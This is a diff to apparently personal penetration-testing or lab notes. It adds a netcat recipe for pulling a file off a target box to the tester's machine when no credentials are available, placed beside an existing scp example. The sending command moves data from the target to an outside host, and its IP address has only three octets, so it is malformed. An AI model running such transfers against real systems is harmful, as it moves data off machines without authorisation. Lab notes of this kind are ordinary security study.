@@ -254,6 +254,17 @@ on own machine
 scp james@10.10.165.113:Alien_autospy.jpg /home/kali/Downloads
 ```
 
+if we don't have credentials use netcat
+
+listen for the file on our machine
+```
+nc -lvp 4444 > suspicious.pcapng
+```
+send file from box
+```
+nc 10.49.144 4444 -w 3 < suspicious.pcapng
+```
+
 ## Active Directory
 
 enumerate users - requires wordlist of usernames
